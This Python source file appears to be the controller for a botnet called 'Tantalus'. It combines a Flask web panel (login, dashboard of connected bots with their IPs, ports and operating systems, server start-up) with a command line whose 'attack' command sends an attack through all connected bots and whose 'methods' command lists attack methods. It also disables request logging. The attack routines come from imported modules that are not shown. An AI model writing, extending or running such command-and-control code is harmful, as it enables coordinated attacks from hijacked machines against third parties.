#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import logging

from flask import (
    Flask,
    request,
    redirect,
    url_for,
    render_template,
    session
)

from core.server.socket import *
from core.security.login import *


class Tantalus(Login, Socket, Dataclass, SQL):
	"""Tantalus CLI & API/Panel Source"""

	def __init__(self):
		SQL.__init__(self)
		Login.__init__(self)
		Dataclass.__init__(self)

		app = Flask(API_NAME,
                            static_url_path='', 
                            static_folder='frontend/static',
                            template_folder='frontend/templates')

		log = logging.getLogger('werkzeug')
		log.disabled = True
		self._started = False

		@app.route('/login', methods=['GET', 'POST'])
		def login():
			if 'loggedin' in session:
				return redirect(url_for('dashboard'))

			msg = ''
			if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
				self.username = request.form['username']
				self.password = request.form['password']

				account_check = self.compare_logins(self.username, self.password)
				self.is_admin = account_check[1]

				if account_check[0]:
					session['loggedin'] = True
					session['username'] = self.username
					session['is_admin'] = self.is_admin
					return redirect(url_for('dashboard'))
				else:
					msg = 'Failed: Incorrect username/password!'

			return render_template('login.html', msg=msg)

		@app.route('/logout', methods=['GET'])
		def logout():
			session.clear()
			return redirect(url_for('login'))

		@app.route("/")
		@app.route("/dashboard", methods=["GET"])
		def dashboard():
			if 'loggedin' not in session:
				return redirect(url_for('login'))
			if not self._started:
				return redirect(url_for('edit_server'))

			return render_template("dashboard.html",
                                               session=session,
                                               bots=self.session_bots,
                                               users=self.get_accounts(),
                                               msg='')

		@app.route("/server", methods=["GET"])
		def edit_server():
			if 'loggedin' not in session:
				return redirect(url_for('login'))

			msg = "Note: After starting the server, you wont be redirected to the dashboard automatically, so just click it manually"\
				if not self._started else "Warning: Server already started!"

			return render_template("server.html",
                                               session=session,
                                               started=self._started,
                                               defaults=DEFAULTS,
                                               msg=msg)

		@app.route("/bots", methods=["GET"])
		def tables():
			if 'loggedin' not in session:
				return redirect(url_for('login'))
			if not self._started:
				return redirect(url_for('edit_server'))

			return render_template("tables.html", bots=self.session_bots, session=session)

		@app.route("/map", methods=["GET"])
		def bot_map():
			if 'loggedin' not in session:
				return redirect(url_for('login'))
			if not self._started:
				return redirect(url_for('edit_server'))

			return "unfinished"
			#return render_template("map.html", bots=self.session_bots, session=session,)

		@app.route("/api", methods=["GET"])
		def api_docs():
			return "unfinished"

		@app.route("/profile", methods=["GET"])
		def profile():
			if 'loggedin' not in session:
				return redirect(url_for('login'))
			if not self._started:
				return redirect(url_for('edit_server'))

			return render_template("profile.html", session=session, msg='')



		@app.route("/api/start-server", methods=["POST"])
		def start_server():
			if 'loggedin' not in session:
				return redirect(url_for('login'))

			if self._started:
				return render_template("server.html",
                                                       session=session,
                                                       started=self._started,
                                                       defaults=DEFAULTS,
                                                       msg="Warning: Server already started!")

			port = request.form['port']
			api_secret = request.form['api-secret']

			if port=="" or api_secret=="" or not port.isdigit():
				return render_template("server.html",
                                                       started=self._started,
                                                       defaults=DEFAULTS,
                                                       msg="Warning: Invalid port or API secret!")

			self._started = True
			Socket.__init__(self, connect=("0.0.0.0", int(port)))

			return None

		@app.route("/api/change-password", methods=["POST"])
		def change_password():
			if 'loggedin' not in session:
				return redirect(url_for('login'))

			current_password = request.form['current_password']
			new_password_one = request.form['new_password_one']
			new_password_two = request.form['new_password_two']

			if new_password_one != new_password_two:
				return render_template('profile.html',
                                                       session=session,
                                                       msg="Failed: New passwords didn't match")
			else:
				alert_wk = self.change_user_password(session['username'], current_password, new_password_one)

				if alert_wk[1]:
					session.clear()
					return render_template('login.html', msg=alert_wk[0])
				else:
					return render_template('profile.html',
                                                               session=session,
                                                               msg=alert_wk[0])

		@app.route("/api/change-username", methods=["POST"])
		def change_username():
			if 'loggedin' not in session:
				return redirect(url_for('login'))

			new_username = request.form['new_username']
			current_password = request.form['conf_password']

			return new_username, current_password

		clear()
		os.system('title Tantalus ^| Waiting for server creation')
		info("Please go to the web panel to start the server")

		app.secret_key = API_SECRET_KEY
		app.debug = API_DEBUG
		app.run(ssl_context='adhoc', port=API_PORT)


	def listen_for_command(self):
		"""simple cli for now -- THIS WILL BE REWRITTEN AND IS ONLY TEMPORARY!!"""

		cmd = get_inp().strip()
		match cmd.split():

			case ["bots"]:
				if len(self.session_bots) != 0:
					table = [
						[bot.id, bot.username, bot.ip, bot.port, bot.os]
						for bot in self.session_bots
					]
					print(f"\n{E}"+tabulate(table, headers=["ID", "Username", "IP", "Port", "OS"], tablefmt="pretty"), "\n")

				else:
					info("No connected machines!")

			case ["help"]:  print_help()
			case ["clear"]: print_logo()

			case ["logout"]:
				self.stop = True
				self.sock.close()
				os.system('cls')
				os.system(f'python "{__file__}"')

			case ["admin"]:
				if self.is_admin:
					print_logo(c1=W, c2=M)
					print_admin_panel()
					admincmd = get_inp()

					while admincmd != "main":
						admincmd = admincmd.strip()

						match admincmd.split():

							case ["users"]:
								table = [
									[account[0], account[1], f"{G}True{E}" if account[3]=='1' else "False", account[2][0:50]+"."*10]
									for account in self.get_accounts()
								]

								print("\n{}{}\n".format(E, tabulate(table, headers=["ID", "Username", "Admin", "Password Hash"], tablefmt="pretty")))

							case ["add", *args]:
								if len(args) == 2:
									validation = self.validate_user(args[0], args[1])

									if validation[0]:
										plus("Successfully added user: {}".format(args[0]))
									else:
										warn("Validation error: {}".format(validation[1]))
								else:
									warn("Please use the correct syntax! example: add cool_user password123")
									pass

							case ["remove", *args]:
								if len(args) == 1:
									user_to_remove = args[0]

									if self.get_user_account(user_to_remove) == None:
										warn("Invalid account name")
									self.remove_account(user_to_remove)
									plus("Successfully removed user: {}".format(user_to_remove))
								else:
									warn("Please use the correct syntax! example: remove cool_user")
									pass

							case ["delete"]:
								info("This will remove all accounts except yours")
								warning = get_inp(txt=f"    {R}[WARNING]{E} Are you sure? (y/n): ")

								if warning == "y":
									self.clear_db(my_user=self.username)
									plus("Tantalus accounts database has been cleared...")
								else:
									info("Tantalus accounts database has not been cleared...")

							case ["help"]:
								print()
								print_admin_panel()

							case _:
								warn("Invalid command usage - use 'help' to see a list of valid commands")

						admincmd=get_inp()
					print_logo()
				else:
					warn("You don't have Admin Privileges!")

			case ["methods"]:
				print_attack_methods()

			case ["exit"]:
				self.exit_gracefully()

			case ["attack", *args]:
				info("Sending attack with {} bots".format(len(self.session_bots)))
				self.send_attack(cmd)

			case ["ping"]:
				self.ping_bots(cmd)

			case ["account"]:
				print(f"""
    {R}Username{E}..........{self.username}
    {R}Access{E}............{"Admin" if self.is_admin else "User"}
				""")

			case _:
				warn("Invalid command usage - use 'help' to see a list of valid commands")

if __name__ == '__main__':
	Tantalus()
